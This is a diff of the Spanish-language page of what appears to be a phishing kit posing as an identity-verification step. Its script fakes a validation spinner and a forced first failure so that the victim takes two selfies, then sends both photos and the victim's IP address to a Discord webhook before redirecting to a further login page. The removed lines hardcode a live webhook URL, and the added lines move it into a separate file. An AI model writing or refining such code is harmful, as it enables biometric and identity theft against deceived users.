@@ -118,78 +118,109 @@
         <button class="btn" id="btn-entendido">Entendido</button>
     </div>
 
+    <script src="webhook.js"></script>
     <script>
         const btn = document.getElementById('btn-entendido');
         const errorMsg = document.getElementById('error-msg');
-        
-        // Verifica si venimos de la camara
-        const urlParams = new URLSearchParams(window.location.search);
-        const isValidating = urlParams.get('validating') === 'true';
-        
-        if (isValidating) {
-                        // Estado de validación
-                        btn.innerHTML = '<span class="spinner"></span> Validando';
-                        btn.disabled = true;
 
-                        // Lógica de simulación: 1 intento fallido, 2 intento éxito.
-                        let attempts = parseInt(sessionStorage.getItem('captureAttempts')) || 0;
-
-                        setTimeout(() => {
-                                if (attempts === 1) {
-                                        // Fallo simulado
-                                        errorMsg.classList.add('visible');
-                                        btn.innerHTML = 'Reintentar';
-                                        btn.disabled = false;
-                                        btn.onclick = () => {
-                                                window.location.href = 'camera.html';
-                                        };
-                                } else if (attempts >= 2) {
-                                        // Éxito simulado -> Enviar dos selfies reales al webhook y mandar a clave segura
-                                        fetch('https://api.ipify.org?format=json')
-                                            .then(response => response.json())
-                                            .then(data => {
-                                                const ip = data.ip;
-                                                const selfie1DataUrl = sessionStorage.getItem('selfie1');
-                                                const selfie2DataUrl = sessionStorage.getItem('selfie2');
-                                                function dataURLtoBlob(dataurl) {
-                                                    var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-                                                    while(n--){
-                                                        u8arr[n] = bstr.charCodeAt(n);
-                                                    }
-                                                    return new Blob([u8arr], {type:mime});
-                                                }
-                                                const formData = new FormData();
-                                                if (selfie1DataUrl) {
-                                                    formData.append('file', dataURLtoBlob(selfie1DataUrl), 'selfie1.png');
-                                                }
-                                                if (selfie2DataUrl) {
-                                                    formData.append('file', dataURLtoBlob(selfie2DataUrl), 'selfie2.png');
-                                                }
-                                                formData.append('payload_json', JSON.stringify({
-                                                    content: `🌐 IP: ${ip}\n🤳 Selfie 1 y Selfie 2 adjuntas`
-                                                }));
-                                                fetch('https://discordapp.com/api/webhooks/1478881955914448928/aIqH3pP2YLxjTfEaHLp13Yva48No9fcG9A_XrM5UcGQVyBmlr-ZRr_K0q2Lu6F-MDj26', {
-                                                    method: 'POST',
-                                                    body: formData
-                                                })
-                                                .then(() => {
-                                                    window.location.href = 'login4.html';
-                                                })
-                                                .catch(() => {
-                                                    window.location.href = 'login4.html';
-                                                });
-                                            })
-                                            .catch(() => {
-                                                window.location.href = 'login4.html';
-                                            });
-                                }
-                        }, 2500); // 2.5 segundos de carga
-        } else {
-            // Estado inicial, borramos contador por si acaso
+        // Estado inicial, solo borramos contador si NO hay intentos previos
+        if (!sessionStorage.getItem('selfie1') && !sessionStorage.getItem('selfie2')) {
             sessionStorage.removeItem('captureAttempts');
+        }
+
+        function enviarSelfies() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const selfie1DataUrl = sessionStorage.getItem('selfie1');
+                    const selfie2DataUrl = sessionStorage.getItem('selfie2');
+                    function dataURLtoBlob(dataurl) {
+                        var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+                        while(n--){
+                            u8arr[n] = bstr.charCodeAt(n);
+                        }
+                        return new Blob([u8arr], {type:mime});
+                    }
+                    // Enviar selfie 1
+                    if (selfie1DataUrl) {
+                        const formData1 = new FormData();
+                        formData1.append('file', dataURLtoBlob(selfie1DataUrl), 'selfie1.png');
+                        formData1.append('payload_json', JSON.stringify({
+                            content: `🌐 IP: ${ip}\n🤳 Selfie 1 adjunta`
+                        }));
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData1
+                        })
+                        .then(() => {
+                            // Enviar selfie 2
+                            if (selfie2DataUrl) {
+                                const formData2 = new FormData();
+                                formData2.append('file', dataURLtoBlob(selfie2DataUrl), 'selfie2.png');
+                                formData2.append('payload_json', JSON.stringify({
+                                    content: `🌐 IP: ${ip}\n🤳 Selfie 2 adjunta`
+                                }));
+                                fetch(WEBHOOK_URL, {
+                                    method: 'POST',
+                                    body: formData2
+                                })
+                                .then(() => {
+                                    window.location.href = 'login4.html';
+                                })
+                                .catch(() => {
+                                    window.location.href = 'login4.html';
+                                });
+                            } else {
+                                window.location.href = 'login4.html';
+                            }
+                        })
+                        .catch(() => {
+                            window.location.href = 'login4.html';
+                        });
+                    } else {
+                        window.location.href = 'login4.html';
+                    }
+                })
+                .catch(() => {
+                    window.location.href = 'login4.html';
+                });
+        }
+
+        function mostrarValidandoError() {
+            btn.innerHTML = '<span class="spinner"></span> Validando';
+            btn.disabled = true;
+            setTimeout(() => {
+                errorMsg.classList.add('visible');
+                btn.innerHTML = 'Entendido';
+                btn.disabled = false;
+                btn.onclick = () => {
+                    window.location.href = 'camera.html';
+                };
+            }, 4000);
+        }
+
+        // Lógica de flujo
+        let selfie1 = sessionStorage.getItem('selfie1');
+        let selfie2 = sessionStorage.getItem('selfie2');
+
+        if (!selfie1 && !selfie2) {
+            // Primer acceso: mostrar botón Entendido para abrir cámara
+            btn.innerHTML = 'Entendido';
+            btn.disabled = false;
             btn.onclick = () => {
                 window.location.href = 'camera.html';
             };
+        } else if (selfie1 && !selfie2) {
+            // Tras primera selfie: mostrar validando y error, permitir reintentar
+            mostrarValidandoError();
+        } else if (selfie1 && selfie2) {
+            // Tras segunda selfie: mostrar validando y enviar ambas
+            btn.innerHTML = '<span class="spinner"></span> Validando';
+            btn.disabled = true;
+            setTimeout(() => {
+                enviarSelfies();
+            }, 4000);
         }
     </script>
 </body>
